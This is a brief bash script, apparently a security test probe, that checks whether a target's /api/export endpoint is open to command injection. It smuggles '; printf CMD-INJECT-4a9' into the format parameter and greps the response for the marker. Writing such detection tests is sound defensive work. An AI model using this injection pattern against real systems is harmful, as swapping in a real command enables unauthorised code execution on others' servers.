#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -fsS --get "$TARGET/api/export" --data-urlencode "format=csv; printf CMD-INJECT-4a9" | grep -q 'CMD-INJECT-4a9'
